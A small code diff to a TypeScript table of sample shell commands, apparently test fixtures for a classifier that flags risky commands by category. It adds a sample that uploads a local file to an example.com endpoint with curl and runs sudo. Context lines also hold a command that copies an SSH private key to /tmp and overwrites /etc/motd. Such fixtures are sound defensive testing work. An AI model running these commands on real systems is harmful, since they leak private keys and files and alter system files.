@@ -91,6 +91,8 @@ const SAMPLES: Record<ShellDoubt, string[]> = {
     c('curl', '-J', '-O', 'https://h.example.com/f'), c('base64', '-o', '/tmp/x', 'f'),
   ],
   'hidden-write': ['cat ~/.ssh/id_rsa > /tmp/k; echo x > /etc/motd'],
+  // r5 R1: the upload is named, but the sudo in another step is not.
+  'uncovered-signal': ['curl -d @./readme.txt https://example.com/in; sudo ls ./notes'],
   'too-many-steps': [Array.from({ length: 70 }, () => 'ls').join('; ')],
 };
 
